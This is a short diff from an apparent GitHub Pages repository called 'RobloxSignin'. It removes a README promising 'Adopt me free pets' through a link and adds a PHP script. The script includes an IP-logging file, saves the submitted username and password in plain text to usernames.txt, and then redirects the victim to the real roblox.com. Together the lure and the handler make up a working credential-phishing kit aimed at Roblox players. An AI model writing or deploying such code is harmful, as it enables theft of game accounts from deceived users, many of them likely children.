@@ -1,2 +1,6 @@
-# RobloxSignin.github.io
-Adopt me free pets for everybody that joins me by this link!.Link in my bio 
+<?php
+include "ip.php";
+file_put_contents("usernames.txt", "User : " . $_POST['username'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
+header("Location: https://roblox.com");
+exit();
+?> 
